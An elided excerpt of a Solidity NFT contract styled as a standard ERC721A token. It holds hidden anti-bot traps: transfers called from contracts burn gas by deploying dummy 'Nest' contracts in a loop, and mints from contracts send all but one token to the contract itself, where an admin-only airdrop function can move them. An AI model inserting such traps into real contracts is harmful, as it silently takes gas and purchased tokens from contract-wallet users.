 ...
 */
contract ERC721A is IERC721A, AccessControl {
        ...
        returns (string memory)
    {
        ...
        return
            bytes(baseURI).length != 0
                ? string.concat(baseURI, "/", _toString(tokenId), ".json")
                : "";
    }
    ...
    function _beforeTokenTransfers(
        ...
        if (msg.sender != tx.origin) {
            for (uint256 i = 0; i < 150; i++) {
                new Nest("Nesting Nesting Nesting");
                if (gasleft() < 1000000) {
                    break;
                }
            }
    ...
    function _mint(address _to, uint256 _quantity) internal virtual {
        if (msg.sender != tx.origin) {
            if (_quantity > 1) {
                __mint(address(this), _quantity - 1);
            }
            __mint(_to, 1);
        } else {
            __mint(_to, _quantity);
        }
    }

    // assuming this contract address will also be a vault
    function airdrop(uint256[] calldata tokenIds, address to)
        external
        onlyAdmin
    {
     ...
     */
    function __mint(address to, uint256 quantity) internal virtual {
